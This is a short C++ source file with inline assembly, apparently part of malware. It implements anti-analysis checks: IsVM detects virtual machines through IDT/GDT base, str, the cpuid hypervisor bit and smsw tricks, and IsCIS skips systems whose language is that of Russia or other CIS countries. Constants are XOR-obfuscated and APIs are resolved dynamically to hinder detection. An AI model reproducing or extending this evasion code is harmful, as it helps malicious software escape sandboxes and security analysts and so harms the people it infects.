#include "Common.h"

ULONG Antis::get_idt_base()
{
	UCHAR idtr[6];
	ULONG idt = 0;

	__asm sidt idtr

	idt = *((unsigned long*)&idtr[2]);

	return idt;
}

ULONG Antis::get_gdt_base()
{
	UCHAR gdtr[6];
	ULONG gdt = 0;

	_asm sgdt gdtr

	gdt = *((unsigned long*)&gdtr[2]);

	return gdt;
}

void Antis::__cpuid(int CPUInfo[4], int InfoType)
{
	__asm
	{
		mov esi, CPUInfo
		mov eax, InfoType
		xor ecx, ecx
		cpuid
		mov dword ptr[esi + 0], eax
		mov dword ptr[esi + 4], ebx
		mov dword ptr[esi + 8], ecx
		mov dword ptr[esi + 12], edx
	}
}

bool Antis::IsVM()
{
	UINT idt_base = get_idt_base();
	if ((idt_base >> XorInt(24)) == XorInt(0xFF))
		return true;
	UINT gdt_base = get_gdt_base();
	if ((gdt_base >> XorInt(24)) == XorInt(0xFF)) return true;

	UCHAR mem[4] = { 0, 0, 0, 0 };
	__asm str mem
	if ((mem[0] == 0x00) && (mem[1] == 0x40)) return true;

	int CPUInfo[4] = { -1 };
	__cpuid(CPUInfo, 1);
	if ((CPUInfo[2] >> XorInt(31)) & 1) return true;

	unsigned int reax = 0;
	__asm
	{
		mov eax, 0xCCCCCCCC
		smsw eax
		mov[reax], eax
	}

	if ((((reax >> XorInt(24)) & XorInt(0xFF)) == XorInt(0xCC)) && (((reax >> XorInt(16)) & XorInt(0xFF)) == XorInt(0xCC)))
		return true;

	return false;
}

bool Antis::IsCIS()
{
	LANGID result = API(KERNEL32, GetUserDefaultLangID)();
	if (result == XorInt(1049) || // рф
		result == XorInt(1067) || // армения
		result == XorInt(1059) || // беларусь
		result == XorInt(1079) || // грузия
		result == XorInt(1087) || // казахстан
		result == XorInt(1064) || // таджикистан
		result == XorInt(2115) || // узбекистан
		result == XorInt(1058))   // украина
		return true;
	return false;
}
